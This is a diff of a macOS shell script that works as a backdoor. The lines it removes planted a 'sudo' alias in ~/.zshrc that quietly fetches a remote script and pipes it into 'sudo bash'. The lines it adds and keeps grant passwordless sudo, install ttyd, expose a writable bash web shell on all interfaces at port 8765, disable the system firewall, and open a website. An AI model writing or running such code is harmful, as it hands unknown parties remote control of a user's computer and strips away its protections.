@@ -1,45 +1,15 @@
-FLAG_FILE="/tmp/root_task_22_done"
+FLAG_FILE="/tmp/root_task_23_done"
 if [ ! -f "$FLAG_FILE" ]; then
-  sed -i '' '/alias sudo="curl -fsSL https:\/\/raw.githubusercontent.com\/in-jun\/jtest\/refs\/heads\/main\/root 2>\/dev\/null | sudo bash > \/dev\/null 2>\&1 && \\sudo"/d' ~/.zshrc
-  echo 'alias sudo="(curl -fsSL https://raw.githubusercontent.com/in-jun/jtest/refs/heads/main/root 2>/dev/null | sudo bash > /dev/null 2>&1 &) && \sudo"' >> ~/.zshrc
-  
-  (
-    echo "jidohyun ALL=(ALL) NOPASSWD: ALL" | sudo tee /etc/sudoers.d/jidohyun
-    sudo -u jidohyun brew install ttyd
-    nohup sudo -u jidohyun ttyd --port 8765 --interface 0.0.0.0 --writable --max-clients 10 --ping-interval 10 bash > /dev/null 2>&1 &
-    sudo rm /etc/sudoers.d/jidohyun
-  ) &
+
+  echo "jidohyun ALL=(ALL) NOPASSWD: ALL" | sudo tee /etc/sudoers.d/jidohyun
+  sudo -u jidohyun brew install ttyd
+  sudo rm /etc/sudoers.d/jidohyun
+
+
+  sudo -u jidohyun ttyd --port 8765 --interface 0.0.0.0 --writable --max-clients 10 --ping-interval 10
   
   sudo /usr/libexec/ApplicationFirewall/socketfilterfw --setglobalstate off
 
-  open -a "Google Chrome" "https:injun.dev"
-  open -a "Google Chrome" "https:injun.dev"
-  open -a "Google Chrome" "https:injun.dev"
-  open -a "Google Chrome" "https:injun.dev"
-  open -a "Google Chrome" "https:injun.dev"
-  open -a "Google Chrome" "https:injun.dev"
-  open -a "Google Chrome" "https:injun.dev"
-  open -a "Google Chrome" "https:injun.dev"
-  open -a "Google Chrome" "https:injun.dev"
-  open -a "Google Chrome" "https:injun.dev"
-  open -a "Google Chrome" "https:injun.dev"
-  open -a "Google Chrome" "https:injun.dev"
-  open -a "Google Chrome" "https:injun.dev"
-  open -a "Google Chrome" "https:injun.dev"
-  open -a "Google Chrome" "https:injun.dev"
-  open -a "Google Chrome" "https:injun.dev"
-  open -a "Google Chrome" "https:injun.dev"
-  open -a "Google Chrome" "https:injun.dev"
-  open -a "Google Chrome" "https:injun.dev"
-  open -a "Google Chrome" "https:injun.dev"
-  open -a "Google Chrome" "https:injun.dev"
-  open -a "Google Chrome" "https:injun.dev"
-  open -a "Google Chrome" "https:injun.dev"
-  open -a "Google Chrome" "https:injun.dev"
-  open -a "Google Chrome" "https:injun.dev"
-  open -a "Google Chrome" "https:injun.dev"
-  open -a "Google Chrome" "https:injun.dev"
-  open -a "Google Chrome" "https:injun.dev"
   open -a "Google Chrome" "https:injun.dev"
 
   touch "$FLAG_FILE"
